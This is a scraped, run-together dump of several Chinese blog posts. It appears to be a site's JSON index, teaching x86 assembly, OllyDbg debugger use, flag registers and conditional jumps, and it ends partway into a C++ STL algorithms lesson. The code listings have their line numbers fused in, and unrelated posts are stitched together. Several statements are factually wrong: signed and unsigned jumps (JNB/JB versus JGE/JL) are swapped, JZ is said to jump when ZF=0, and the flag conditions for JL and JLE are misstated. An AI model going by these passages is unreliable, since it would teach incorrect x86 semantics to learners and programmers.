printf(&quot;未跳转\\n&quot;);end:​ printf(&quot;跳转\\n&quot;);​ printf(&quot;end\\n&quot;);getchar();00401004 |. 68 F4204000 PUSH JNE_JNZ.004020F4 ; /format = &quot;begin\\n&quot;00401009 |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040100F |. 83C4 04 ADD ESP,400401012 |. C745 FC 04000&gt;MOV DWORD PTR SS:[EBP-4],4 ; a=400401019 |. B8 03000000 MOV EAX,3 ; eax=30040101E |. 2B45 FC SUB EAX,DWORD PTR SS:[EBP-4] ; 3-4 cmp eax,[ebp-4]00401021 |. 74 0E JE SHORT JNE_JNZ.0040103100401023 |. 68 FC204000 PUSH JNE_JNZ.004020FC ; /format = &quot;未跳转&quot;00401028 |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040102E |. 83C4 04 ADD ESP,400401031 |&gt; 68 04214000 PUSH JNE_JNZ.00402104 ; /format = &quot;跳转&quot;00401036 |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040103C |. 83C4 04 ADD ESP,40040103F |. 68 0C214000 PUSH JNE_JNZ.0040210C ; /format = &quot;end\\n&quot;00401044 |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040104A |. 83C4 04 ADD ESP,40040104D |. FF15 9C204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.getchar&gt;] ; MSVCR90.getchar 知识点： 无条件跳转指令jmp goto指令 优化后的指令 一、GOTO与JMP 无条件跳转指令 格式: JMP A 其中A为转移的目的地址。程序转移到目的地址所指向的指令继续往下执行。 // JZ/JE JNZ/JNE 都需要一个条件，条件成立才跳转，而jmp不需要。 本组指令对标志位无影响. 3、代码测试 12345678910111213//goto jmp​ printf(&quot;begin\\n&quot;);​ goto end; printf(&quot;do this&quot;);end:​ printf(&quot;end\\n&quot;);getchar(); 二、优化后的指令 /0d 禁用优化 /01 最小化大小 /02 最大化速度 /0x 完全优化 优化功能对嵌入汇编代码的程序无效 撤销对汇编指令更改 ALT+BACKSPACE键 知识点： 条件转移指令 JNGE 条件转移指令 JL 一、指令格式 条件转移指令 JL/JNGE 格式: JL/JNGE 标号地址 功能: 小于/不大于等于时转移 标号地址 JNGE 有符号 不大于等于 则跳转 //Jump if Not Greater or Equal JL 有符号 小于 则跳转 //Jump if Less SF=1; 符号标志位为1 则跳转到标号地址执行 二、代码测试 12345678910111213141516171819202122232425262728293031323334353637 printf(&quot;begin\\n&quot;);​ //&gt;=​ int a=0xA;​ int b=0x20;​ //if (a&gt;=b) //jl​ //&#123;​ // printf(&quot;do this&quot;);​ //&#125;​ __asm ​ &#123;​ mov ebx,b​ sub a,ebx​ jnge end​ mov ebx,ebx​ jl end​ &#125;​ //&lt; end:​ printf(&quot;end\\n&quot;); 知识点： 条件转移指令 JLE 条件转移指令 JNG 一、指令格式 条件转移指令 JLE/JNG 格式: JLE/JNG 标号地址 功能: 小于等于/不大于 时转到标号地址 JNG 有符号 不大于 则跳转 //Jump if Not Greater JLE 有符号 小于等于 则跳转 //Jump if Less or Equal SF=1,ZF=1,OF=1 //其中一个或者多个为1 则跳转 二、代码测试 1234567891011121314151617181920212223 &#123;​ printf(&quot;begin\\n&quot;);​ int a=3;​ int b=5;​ if (a&gt;b) //JLE/JNG 小于等于/不大于时转移​ &#123;​ printf(&quot;do this&quot;);​ &#125; //JNG 不大于​ printf(&quot;end;\\n&quot;);​ return 0;&#125; OD ctrl+* 设置下一条要执行指令的地址 简单的说就是设置EIP JNC 指令：Jump Not Carry 没进位时跳转 //CF=0 JC ;进位则跳转 CF=1 知识点： 条件转移指令 JG（&gt; 时转移) 条件转移指令 JNLE(&lt;=时不转移) 条件转移指令 JGE(&gt;=时转移) 条件转移指令JNL(&lt;时不转移) 一、指令格式 1234JG/JNLE 标号地址 不&lt;= //大于 &gt; // ZF=0 &amp;&amp; SF=0 &amp;&amp; OF=0JGE/JNL 标号地址 不&lt; //大于等于 &gt;= ZF=1 || SF=0 || OF=0时跳转 JG : Jump if Greater // &gt; 跳 JNLE:Jump if Not Less or Equal //不&lt;= 跳 JGE :Jump if Greater or Equal // &gt;= 跳 JNL: Jump if Not Less //不&lt; 跳 二、代码测试 12345678910111213141516171819202122232425262728293031323334353637 printf(&quot;begin\\n&quot;);​ int a=4;​ //if (a&lt;=3)​ //if (!(a&gt;3))​ // ​ //&#123;​ // printf(&quot;小于等于&quot;);​ //&#125;//大于时跳转//不小于等于跳转 ​ __asm​ &#123;​ cmp a,3​ JNLE end //JG end​ &#125;​ printf(&quot;do this\\n&quot;);​ printf(&quot;小于等于&quot;);end:​ printf(&quot;end&quot;);​ return 0; 12345678910111213141516JMP //014JE/JZ //= //012 Jump if Equl JNE/JNZ //不= //013//带符号数条件转移指令JL /JNGE //不&gt;= //小于 &lt; //015JLE/JNG //不&gt; //小于等于&lt;= //016JG/JNLE //不&lt;= //大于 &gt;//017JGE/JNL //不&lt; //大于等于&gt;= //017Jump 跳转/转移Not 不Equal 相等Zero 零Less 小于Greater 大于 知识点： 12345678910111213141516171819202122二、代码测试 JE/JZ ！= 不跳转 JNZ/JNE == 不跳转 JG/JNLE &lt;= 不跳转 JGE/JNL &lt; 不跳转 JL/JNGE &gt;= 不跳转JLE/JNG &gt; 不跳转 printf(&quot;begin\\n&quot;); //unsigned int a=3,b=5; if (a!=b) //je if (a==b) //jnz if (a&lt;=b) //jg if (a&lt;b) //jge if (a&gt;=b) //jl if (a&gt;b)//jle &#123; printf(&quot;do if&quot;); &#125; printf(&quot;end&quot;);return 0; 知识点： JA （&gt; 时转移) JNBE(&lt;=时不转移) JA与JG的区别 Above 高于 Below低于 一、无符号大于转移指令JA/JNBE JA : 高于 时跳转 // &gt;时跳转 JNBE: 不低于等于 时跳转 //&lt;=时不跳转 ​ CF(进位标志位)：当执行一个加法（减法）运算时，最高位产生进位（或借位）时，CF为1，否则为0。 ​ ZF零标志位：若当前的运算结果为零，则ZF为1，否则为0。 JA与JG区别： JG是带符号数比较 &gt; JA是无符号数比较 &gt; 二、代码测试 1234567891011121314151617 //**CF(进位标志位)**​ printf(&quot;begin\\n&quot;);​ int a=3,b=-5;​ unsigned int a2=a,b2=b; ​ if (a2&lt;=b2)//无符号的生成JA 不够减 借位​ if (a&lt;=b) ///&lt;=时不跳转&gt;时跳转带符号的生成JG指令​ &#123;​ printf(&quot;do if\\n&quot;);​ &#125; 知识点： JNB （不小于) JAE (高于等于) JNC （CF！=1） JNB与JGE的区别 一、无符号大于转移指令JA/JNBE JNB : 低于 时不跳转 //&gt;=时跳转 //OD JAE: 高于等于 时跳转 //&gt;=时跳转 JNC ：Jump Not Carry 没进位时跳转 //CF=0 JA与JG区别： JNB 是带符号数比较 &gt;= JGE 是无符号数比较 &gt;= 二、代码测试 12345678910111213141516171819 //CF(进位标志位)​ printf(&quot;begin\\n&quot;);​ int a=3,b=-5;​ unsigned int a2=a,b2=b; ​ if (a2&lt;b2)//无符号的生成JAE JNB 不够减借位​ if (a&lt;b) ///&lt;时不跳转&gt;时跳转带符号的生成JGE JNL指令​ &#123;​ printf(&quot;do if\\n&quot;);​ &#125; 知识点： JB/JNAE/JC &lt;指令 与JL/JNGE区别 一、无符号大于转移指令JB/JNAE/JC JB 低于 时跳转 //&lt; 时跳转 //OD JNAE: 高于等于 时不跳转 //**&gt;=**时不跳转 JC ：Jump Carry 进位时跳转 //CF=1 JB与JL区别： JB 是带符号数比较 &gt;= JL 是无符号数比较 &gt;= 二、代码测试 ​ 1234567891011121314151617//CF(进位标志位)​ printf(&quot;begin\\n&quot;);​ int a=3,b=-5;​ unsigned int a2=a,b2=b; ​ if (a2**&gt;=** b2)//无符号的生成JAE JNB 不够减借位​ if (a**&gt;=** b) ///&lt;时不跳转&gt;时跳转带符号的生成JGE JNL指令​ &#123;​ printf(&quot;do if\\n&quot;);​ &#125; 知识点： JBE/JNA &lt;=指令 与JLE/JNG区别 一、无符号大于转移指令JBE/JNA JBE: 低于等于 时跳转 // &lt;=时跳转 //OD **JNA: 高于 时不跳转 //&gt; 不跳转 ** JBE与JLE区别： JLE 是带符号数比较 &gt;= JBE 是无符号数比较 &gt;= 二、代码测试 12345678910111213141516171819 //CF(进位标志位)​ printf(&quot;begin\\n&quot;);​ int a=3,b=-5;​ unsigned int a2=a,b2=b; ​ if (a2&gt;=b2)//无符号的生成JAE JNB 不够减借位​ if (a&gt;= b) ///&lt;时不跳转&gt;时跳转带符号的生成JGE JNL指令​ &#123;​ printf(&quot;do if\\n&quot;);​ &#125;","categories":[{"name":"汇编逆向","slug":"汇编逆向","permalink":"https://xiaowuyoucy.github.io/categories/汇编逆向/"}],"tags":[]},{"title":"1-12","slug":"hbnx001-1-12","date":"2021-07-12T15:22:37.000Z","updated":"2021-07-24T18:43:27.211Z","comments":true,"path":"2021/07/12/hbnx001-1-12/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/12/hbnx001-1-12/","excerpt":"","text":"OD 按下F2断点/关闭断点 跳到被调用的地方的下一条语句 按下回车会鼠标右键选择反汇编窗口中跟随 定位到指定API函数的地方 按下Ctrl + G 或 鼠标右键选择转到-&gt;表达式 或者输入命令 bp api函数名 查看所有断点 按下 ALT + B 或 鼠标点击菜单栏 查看-&gt;断点 将OD添加到鼠标右键菜单栏 OD断点历史记录文件夹 c或c++内联汇编 12345678910111213141516171819// 001_MOV.cpp : 定义控制台应用程序的入口点。//#include&lt;iostream&gt;#include &lt;Windows.h&gt;int aaa = 1;int main(int argc, TCHAR* argv[])&#123; MessageBoxW(0, NULL, NULL, MB_OK); aaa = 0x889977;//MOV DWORD PTR DS:[0x403018],0x889977 __asm &#123; mov aaa, 0x889977 &#125; __asm mov aaa, 0x889977; MessageBoxW(0, NULL, NULL, MB_OK); return 0;&#125; MOV指令 aaa=0x889977; MOV DWORD PTR DS:[0x403018],0x889977 dword 双字 就是四个字节 ptr pointer缩写 即指针 []里的数据是一个地址值 dd指令 查看数据的指令 dd 地址 dd 0x403018 == dd 403018 知识点： 函数与CALL 关闭C/C++优化 单步步过 单步步入 一、函数与CALL 1234567891011121314151617181920212223int add(int a,int b)&#123; return a+b;&#125;00401030 |. 8105 18304000&gt;ADD DWORD PTR DS:[403018],88 ; add 加法指令未被优化00401040 |. 68 88000000 PUSH 8800401045 |. A1 18304000 MOV EAX,DWORD PTR DS:[403018]0040104A |. 50 PUSH EAX0040104B |. E8 B0FFFFFF CALL 001_MOV.00401000 ; add函数00401050 |. 83C4 08 ADD ESP,800401053 |. A3 18304000 MOV DWORD PTR DS:[403018],EAX 二、关闭C/C++优化 项目配置属性—&gt; C/C++ —&gt;优化—&gt;禁用/Od 三、单步步入：(进CALL) F9(运行): 如果断下后，要继续让程序运行起来，可以用快捷键 F7(单步步入):按下后执行下一条指令。如果有CALL则进入。 四、单步步过：(不进CALL) F8(单步步过):按下后执行下一条指令。不会进入子函数CALL里边，子函数CALL也被当成一条指令。 这两个单步执行操作的主要区别在于：如果当前的命令是一个子函数，按，将会进入子函数，并停在子函数的第一条命令上；而按，将会一次运行完这个子函数。如果您单步步过的子函数中含有断点或其他调试事件，执行将会被暂停 知识点： 立即寻址 寄存器寻址 寄存器间接寻址 直接寻址方式 直接寻址方式 寄存器相对寻址 一、了解指令常用寻址方式 寻址方式就是寻找操作数或操作数地址的方式。 寄存器是中央处理器内的组成部分。寄存器是一组容量有限的高速存贮部件，它们可用来暂存指令、数据和位址。（DWORD） 1234567891011MOV EAX，0x1234 //立即寻址 MOV EAX，EBX //寄存器寻址 数据寄存器,一般称之为通用寄存器组 通用寄存器有4个 EAX,EBX,ECX,EDX MOV EAX，[EBX] //寄存器间接寻址 MOV EAX，v //v是一个变量名 MOV EAX，[1234] //直接寻址方式 MOV EAX，[EBX+1234] //寄存器相对寻址 二、理解寻址 上边的名字看起来很多，总结起来也就2种方式： 带[]与不带[] 1、不带括号的 有立即数与寄存器 2、带括号的就是指针，从地址里边取值出来。 1234567891011MOV EAX，0x1234 //立即寻址 eax=0x1234; MOV EAX，EBX //寄存器寻址 eax=ebx MOV EAX，[EBX] //寄存器间接寻址 eax=*(int*)ebx; MOV EAX，v //v是一个变量名 eax=v; //被编译后 一般会呈后边两种形式MOV EAX，[1234] //直接寻址方式 eax=*(int*)(0x1234)MOV EAX，[EBX+1234] // 寄存器相对寻址 eax=*(int*)((int)ebx+1234); //这里的1234称为偏移，EBX是基址 三、对调位置 12345678910111213MOV EAX，0x1234 //立即数不能出现在MOV指令左边。如： MOV 0x1234,EAX 这是错的写法 后边的都可以对换位置 MOV EAX，EBX //寄存器寻址 eax=ebx mov ebx,eax MOV EAX，[EBX] //寄存器间接寻址 eax=*(int*)ebx; mov [ebx],eax MOV EAX，v //v是一个变量名 eax=v; mov v,eaxMOV EAX，[1234] //直接寻址方式 eax=*(int*)(0x1234) mov [1234],eaxMOV EAX，[EBX+1234] // 寄存器相对寻址 eax=*(int*)((int)ebx+1234) mov [ebx+1234],eax 四、代码测试 int *da=a;//int a[0x10]={0,1,2,3,4,5,6,7,8,9,0xA,0xB,0xC,0xd,0xe}; //提示 在命令栏中用 dd 地址表达式 可以以DWORD 4字节格式显示指定地址的数据 1234567891011121314151617__asm&#123;mov eax,0x1111 mov ebx,eaxmov ebx,bbb //全局变量bbb mov ebx,da //取数组基址 mov eax,[da+4] mov eax,[ebx+4]&#125; 123456789101112131415//下边指令，前边是寄存器相对寻址，后边是立即寻址0040105A |. C745 FC 20304&gt;MOV DWORD PTR SS:[EBP-4],001_MOV.00403020 ; int *da=a //a是数组的地址 00401061 |. B8 11110000 MOV EAX,1111 ; eax=0x1111 立即寻址00401066 |. 8BD8 MOV EBX,EAX ; mov ebx,0x1111--&gt;ebx=0x1111 //寄存器寻址00401068 |. 8B1D 18304000 MOV EBX,DWORD PTR DS:[403018] ; mov ebx,008899FF--&gt;ebx=009988FF 直接寻址0040106E |. 8B5D FC MOV EBX,DWORD PTR SS:[EBP-4] ; mov ebx,da 寄存器 相对寻址00401071 |. 8B45 00 MOV EAX,DWORD PTR SS:[EBP] //寄存器间接寻址00401074 |. 8B43 04 MOV EAX,DWORD PTR DS:[EBX+4] ; eax=da[1]=1 寄存器 相对寻址 dd命令 12345dd eax + 2 * 8dd eaxdd 0x11111 定位到指定地址 知识点： 加法汇编指令ADD 一、加法指令 ADD(Addition) 格式 格式: ADD A,B //A=A+B; 功能: 两数相加 OPRD1为任一通用寄存器或存储器操作数,可以是任意一个通用寄存器,而且还可以是任意一个存储器操作数. OPRD2为立即数,也可以是任意一个通用寄存器操作数.立即数只能用于源操作数B. A和B均为寄存器是允许的,一个为寄存器而另一个为存储器也是允许的, 但不允许两个都是存储器操作数. //也就是说A与B不能同时是指针 如: add [eax],[ebx] 这类情况是错的 例子： 第三课中的add函数里 有如下2句代码 12300401003 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8] ; a00401006 |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C] ; b //eax=a+b 二、ADD指令测试 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980int _tmain(int argc, _TCHAR* argv[])&#123; int i=0; printf(&quot;&quot;); i=i+0x100; i=i+0x111; int *p=&amp;i; __asm &#123; mov eax,0x222 mov ebx,0x100 add ebx,eax //ebx322 // mov ebx,p add [ebx],0x111//00401048 |. 8003 11 ADD BYTE PTR DS:[EBX],11 ; i=i+11 add i,0x111 //DWORD WORD &#125; /* 0040101C |. 8B45 F8 MOV EAX,DWORD PTR SS:[EBP-8] ; eax=i=0 0040101F |. 05 00010000 ADD EAX,100 ; eax=eax+100=0+100=100 00401024 |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX ; i=eax=100 00401027 |. 8B4D F8 MOV ECX,DWORD PTR SS:[EBP-8] ; ecx=i=100 0040102A |. 81C1 11010000 ADD ECX,111 ; ecx=ecx+111=100+111=0x211 00401030 |. 894D F8 MOV DWORD PTR SS:[EBP-8],ECX ; i=ecx=0x211 00401033 |. 8D55 F8 LEA EDX,DWORD PTR SS:[EBP-8] ; edx=&amp;i=ebp-8; 00401036 |. 8955 FC MOV DWORD PTR SS:[EBP-4],EDX ; p=&amp;i 00401039 |. B8 22020000 MOV EAX,222 0040103E |. BB 00010000 MOV EBX,100 00401043 |. 03D8 ADD EBX,EAX ; ebx=ebx+eax=100+222=322 00401045 |. 8B5D FC MOV EBX,DWORD PTR SS:[EBP-4] ; ebx=i=edx=ebp-8 00401048 |. 8003 11 ADD BYTE PTR DS:[EBX],11 ; i=i+11 0040104B |. 8145 F8 11010&gt;ADD DWORD PTR SS:[EBP-8],111 ; i=i+111 */ printf(&quot;&quot;); return 0;&#125; OD按下-号可以返回上一步 知识点： 十六进制 字节，字，双字 汇编中的内存单元长度修饰 add [ebx],0x111 //00401048 |. 8003 11 ADD BYTE PTR DS:[EBX],11 ; i=i+11 一、十六进制 十六进制同我们日常中的十进制表示法不一样。它由0-9,A-F,组成。与10进制的对应关系是：0-9对应0-9;A-F对应10-15; 十进制元素(0,1,2,3,4,5,6,7,8,9) 十六进制元素(0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F) 9+1=10; //十进制 A F+1=10; //十六进制 99+1=100;//十进制 0x64 FF+1=100;//十六进制 11616=256 //0xBDA=111616+13*16+10 十六进制一般会加上前缀0x 汇编中也可以加上h后缀 //想一想 十六进制中 0x0F+2=0x11 0xF9+1=0xFA 0x10+1=0x11 0x18+8=0x20 8+9=0x11 二、字节，字，双字 字节 (1字节):BYTE类型 ( unsigned char) 0-255 表示成16进制0–0xFF 字 (2字节):WORD类型 (unsigned short) 0-65535， 表示成16进制0–0xFFFF 双字 (4字节):DWORD类型(unsigned long) 0-4294967295 表示成16进制0–0xFFFFFFFF 四字(8字节) QWORD 类型 (unsigned long long ) 64 位整数，Q 代表四（字） 三、汇编中的内存单元长度修饰 1、自动加上修饰前缀规律 后面是寄存器会自动加上前缀修饰符 12345678910111213141516171819 int pb=3; mov [eax],ebx mov edx,[ecx] mov ebx,pbBYTE c=3;WORD w=4;DWORD dw=5;mov c,0x87654321mov w,0x87654321mov dw,0x87654321 2、必须手动添加内存单元长度修饰的情况 前边是存储器，后边是常量的情况，需要手动添加长度修饰 1234567891011121314151617181920212223242526272829303132333435363738394041add [ebx],0x111 //特殊... 因为编译器不知道具体长度，会默认为 字节长度mov byte ptr [ebx],0x87654321mov word ptr [ebx],0x87654321mov dword ptr [ebx],0x87654321 BYTE c=3; WORD w=4; DWORD dw=5; __asm &#123; add c,0x87654321 // mov [ebp-??],0x21 add w,0x87654321 add dw,0x87654321 /* 自动添加的长度修饰符 00401071 |. 8045 EF 21 ADD BYTE PTR SS:[EBP-11],21 ; c=21 00401075 |. 66:8145 FC 21&gt;ADD WORD PTR SS:[EBP-4],4321 ; w=4321 0040107B |. 8145 F0 21436&gt;ADD DWORD PTR SS:[EBP-10],87654321 ; dw=87654321 */ &#125; 知识点： 寄存器EAX 寄存器AX 寄存器AH 寄存器AL 一、EAX与AX,AH,AL关系图 EAX，EBX，ECX，EDX都有低16位和低8位，高8位寄存器 ESP，EBP，ESI，EDI只有低16位寄存器例如 SP,BP,SI,DI，而没有低8位和高8位 数据查看命令 dd 查看DWORD内存 dw 查看WORD内存 db 查看BYTE内存 一格表示一字节 二、代码测试 1、OD命令栏 ？号指令 （用计显示表达式的值) ? ax 查看ax的值 ? eax 查看eax的值 ? al 查看al的值 ? ah查看ah的值 123456789101112131415161718192021222324252627282930313233 printf(&quot;&quot;); int i_AX,i_AH,i_AL; __asm &#123; mov eax,0x87654321 ; mov word ptr [i_AX],ax mov byte ptr [i_AH],ah mov byte ptr [i_AL],al &#125;#include &lt;Windows.h&gt;int _tmain(int argc, _TCHAR* argv[])&#123; DWORD iEax; WORD iAx; BYTE iAh,iAl; printf(&quot;\\n&quot;); __asm &#123; mov eax,0x87654321 mov iEax,eax mov iAx,ax mov iAh,ah mov iAl,al &#125; printf(&quot;EAX=%x,AX=%x,AH=%x,AL=%x \\n&quot;,iEax,iAx,iAh,iAl); getchar(); return 0;&#125; 知识点： MOVSX符号扩展传送 MOVZX零扩展传送 一、MOVSX与MOVZX格式 MOVSX 操作数A ，操作数B MOVZX 操作数A ，操作数B 相同点：操作数B 空间必须小于 操作数A 1、格式与MOV基本相同 2、能完成小存储单元向大存储单元的数据传送 比如 movsx eax,bx movzx ebx,ax movsx eax,bx 正确语法: 1234MOVSX EAX,AXMOVSX EBX,BLMOVZX EDX,DXMOVZX EDX,DL 错误写法: 12MOVSX EAX,EAX //第二个操作数内存等于第一个操作数MOVSX AX,EAX //第二个操作数内存大于第一个操作数 MOVSX，MOVZX 与MOV指令区别： 1、MOVSX，MOVZX的操作数B所占空间必须小于操作数A. 2、MOV指令是原值传送，不会改动。而MOVSX与MOVZX有可能会改动 MOVSX与MOVZX的区别： 1、MOVSX将用操作数B的符号位扩展填充操作数A的余下空间，如果是负数则符号位为1，如果是正数则和MOVZX功能相同 2、MOVZX将用0来扩展填充操作数A的余下空间。 操作数A 操作数B 二、代码测试 1234567891011 int i=0x888; char ci=-100; printf(&quot;\\n&quot;); i=ci; //111111111111111111111111 11001101 i=(unsigned char)ci; // 11001101printf(&quot;&quot;); 判断有符号十六进制是正数还是负数 char 0-FF //FF/2 DWORD 0-0xFFF 8F8F 最高为大于等于8的是负数,1至7是正数 OD按下F4键可以运行到鼠标指定的指令,前提是程序必须会经过这条指令 知识点： LEA指令 &amp;与LEA OD里修改汇编代码 在指定的指令位置按下空格键或 一、LEA指令格式 有效地址传送指令 LEA 格式: LEA 操作数A, 操作数B 功能: 将操作数B的有效地址传送到指定的的某个寄存器，操作数A必须是寄存器。(32位系统上就是32位寄存器) 不能两个操作数都是内存操作的 12错误写法LEA DWORD PTR DS:[EBX],DWORD PTR DS:[0X123456] 二、C++代码测试 123int i;int *p=&amp;i; 三、OD里修改汇编代码 按下空格后 直接输入汇编代码 四、汇编代码测试 123456789101112131415int i=0:char a[4]=&#123;0&#125;;__asm&#123; lea ebx,i // ebx=&amp;i mov dword ptr [ebx],0x113388 mov i,0x776628&#125; 知识点： OD调试 命令栏指令 一、OD调试 重新开始：Ctrl+F2 转到地址：CTRL+G 断点切换: F2 断点窗口: Alt+B 运行 : F9 暂停 : F12 单步步过: F8 //遇到CALL跳过 单步步入: F7 //遇到CALL进入 运行到选定位置 :F4 //这个主菜单上没有，右键菜单-断点-F4 反汇编窗口中跟随 :回车键enter 跟随: 回车键enter //进入某个地址 执行到返回 CTRL + F9 右键菜单–转到 +号：转到下一步 //Plus -号：转到上一步 //Minus *号：转到当前指令地址 //EIP 寄存器窗口: 二、命令栏指令 bp 下断点 bc 清除断点 dd 以双字方式显示数据 dw 以字方式显示数据 db 以字节方式显示数据 ？ 计算表达式的值 知识点： 汇编减法指令sub 初识标志位 标志寄存器PSW ZF（零标志） 一、标志寄存器PSW 标志寄存器PSW(程序状态字寄存器PSW) 标志寄存器PSW是一个16为的寄存器。它反映了CPU运算的状态特征并且存放某些控制标志。8086使用了16位中的9位，包括6个状态标志位和3个控制标志位。 CF(进位标志位)：当执行一个加法（减法）运算时，最高位产生进位（或借位）时，CF为1，否则为0。 ZF零标志位：若当前的运算结果为零，则ZF为1，否则为0。 SF符号标志位：该标志位与运算结果的最高位相同。即运算结果为负，则SF为1，否则为0。 OF溢出标志位：若运算结果超出机器能够表示的范围称为溢出，此时OF为1，否则为0。判断是否溢出的方法是：进行二进制运算时，最高位的进位值与次高位的进位值进行异或运算，若运算结果为1则表示溢出OF=1，否则OF=0 PF奇偶标志：当运算结果的最低16位中含1的个数为偶数则PF=1否则PF=0 AF辅助进位标志：一个加法（减法）运算结果的低4位向高4位有进位（或借位）时则AF=1否则AF=0 另外还有三个控制标志位用来控制CPU的操作，可以由程序进行置位和复位。 TF跟踪标志：该标志位为方面程序调试而设置。若TF=1，8086/8088CPU处于单步工作方式，即在每条指令执行结束后，产生中断。 IF中断标志位：该标志位用来控制CPU是否响应可屏蔽中断。若IF=1则允许中断，否则禁止中断。 DF方向标志：该标志位用来控制串处理指令的处理方向。若DF=1则串处理过程中地址自动递减，否则自动递增。 OD里能查看到除IF标志外的 8个标志位 二、SUB指令 减法指令SUB (SUBtract) 格式: SUB A,B //A=A-B; 功能: 两个操作数的相减,即从A中减去B,其结果放在A中. SUB指令会影响标志位 如果SUB EAX,EBX 等于0的话,ZF标志位会置为1,说明两数相等 知识点： 比较指令CMP 条件跳转指令JZ ZF（零标志） CMP 和JZ 指令 比较指令CMP 格式: CMP A,B // A-B; 功能: 两个操作数的相减,即从A中减去B，其结果会影响标志位， 对标志位的影响与SUB指令相同。本条指令主要是用于配合条件转移指令使用。如JZ ZF=0时，跳转 条件转移指令 JE/JZ 格式: JE/JZ标号 //等于跳转 功能: ZF＝1,转到指定地址执行 说明: 指令JE与JZ等价,它们是根据标志位ZF进行转移的指令 JE,JZ均为一条指令的两种助记符表示方法 12345678910111213 printf(&quot;begin\\n&quot;); int a=3; if (a!=3) &#123; printf(&quot;do code\\n&quot;); &#125;printf(&quot;end&quot;);","categories":[{"name":"汇编逆向","slug":"汇编逆向","permalink":"https://xiaowuyoucy.github.io/categories/汇编逆向/"}],"tags":[]},{"title":"算法","slug":"cpp0088-算法","date":"2021-07-05T10:16:24.000Z","updated":"2021-07-24T22:08:35.850Z","comments":true,"path":"2021/07/05/cpp0088-算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0088-算法/","excerpt":"","text":"算法 算法基础 算法概述 算法部分主要由头文件&lt;algorithm&gt;，&lt;numeric&gt;和&lt;functional&gt;组成。 &lt;algorithm&gt;是所有STL头文件中最大的一个，其中常用到的功能范围涉及到比较、交换、查找、遍历操作、复制、修改、反转、排序、合并等等。 &lt;numeric&gt;体积很小，只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。 &lt;functional&gt;中则定义了一些模板类，用以声明函数对象。 STL提供了大量实现算法的模版函数，只要我们熟悉了STL之后，许多代码可以被大大的化简，只需要通过调用一两个算法模板，就可以完成所需要的功能，从而大大地提升效率。 #include &lt;algorithm&gt; #include &lt;numeric&gt; #include &lt;functional&gt; STL中算法分类 操作对象 直接改变容器的内容 将原容器的内容复制一份,修改其副本,然后传回该副本 功能: 非可变序列算法 指不直接修改其所操作的容器内容的算法 计数算法 count、count_if 搜索算法 search、find、find_if、find_first_of、… 比较算法 equal、mismatch、lexicographical_compare 可变序列算法 指可以修改它们所操作的容器内容的算法 删除算法 remove、remove_if、remove_copy、… 修改算法 for_each、transform 排序算法 sort、stable_sort、partial_sort、 排序算法 包括对序列进行排序和合并的算法、搜索算法以及有序序列上的集合操作 数值算法 对容器内容进行数值计算 常用算法汇总 常用的查找算法： adjacent_find()（ adjacent 是邻近的意思）,binary_search(),count(), count_if(),equal_range(),find(),find_if()。 常用的排序算法： merge(),sort(),random_shuffle()（shuffle是洗牌的意思） ,reverse()。 常用的拷贝和替换算法： copy(), replace(), replace_if(),swap() 常用的算术和生成算法： accumulate()（ accumulate 是求和的意思）,fill(),。 常用的集合算法： set_union(),set_intersection(), set_difference()。 常用的遍历算法： for_each(), transform()（ transform 是变换的意思） 算法中函数对象和谓词 函数对象和谓词定义 函数对象： 重载函数调用操作符的类，其对象常称为函数对象（function object），即它们是行为类似函数的对象。一个类对象，表现出一个函数的特征，就是通过“对象名+(参数列表)”的方式使用一个类对象，如果没有上下文，完全可以把它看作一个函数对待。 这是通过重载类的operator()来实现的。 “在标准库中，函数对象被广泛地使用以获得弹性”，标准库中的很多算法都可以使用函数对象或者函数来作为自定的回调行为； 谓词： 一元函数对象：函数参数1个； 二元函数对象：函数参数2个； 一元谓词 函数参数1个，函数返回值是bool类型，可以作为一个判断式 ​ 谓词可以使一个仿函数，也可以是一个回调函数。 二元谓词 函数参数2个，函数返回值是bool类型 一元谓词函数举例如下 1，判断给出的string对象的长度是否小于6 1234567bool GT6(const string &amp;s)&#123;return s.size() &gt;= 6;&#125; 2,判断给出的int是否在3到8之间 1234567bool Compare( int i )&#123;return ( i &gt;= 3 &amp;&amp; i &lt;= 8 );&#125; 二元谓词举例如下 1，比较两个string对象，返回一个bool值，指出第一个string是否比第二个短 1234567bool isShorter(const string &amp;s1, const string &amp;s2)&#123;return s1.size() &lt; s2.size();&#125; 一元函数对象案例 12345678910111213141516171819202122232425262728293031323334353637383940414243//1普通类 重载 函数调用操作符template &lt;typename T&gt;void FuncShowElemt(T &amp;t) //普通函数 不能像 仿函数那样记录状态&#123; cout &lt;&lt; t &lt;&lt; &quot; &quot;;&#125;;void showChar(char &amp;t)&#123; cout &lt;&lt; t &lt;&lt; &quot; &quot;;&#125;//函数模板 重载 函数调用操作符template &lt;typename T&gt;class ShowElemt&#123;public: ShowElemt() &#123; n = 0; &#125; void operator()(T &amp;t) &#123; n++; cout &lt;&lt; t &lt;&lt; &quot; &quot;; &#125; void printCount() &#123; cout &lt;&lt; n &lt;&lt; endl; &#125;public: int n;&#125;;//1 函数对象 基本使用void main11()&#123; int a = 100; FuncShowElemt&lt;int&gt;(a); //普通的函数调用 ShowElemt&lt;int&gt; showElemt; //函数对象 showElemt(a); //函数对象调用 &#125; 一元谓词案例 1234567891011121314151617181920212223242526272829303132333435//1元谓词 例子template &lt;typename T&gt;class Isdiv&#123;public: Isdiv(const T &amp;divisor) // &#123; this-&gt;divisor = divisor; &#125; bool operator()(T &amp;t) &#123; return (t%divisor == 0); &#125;protected:private: T divisor;&#125;;void main13()&#123; vector&lt;int&gt; v2; for (int i=10; i&lt;33; i++) &#123; 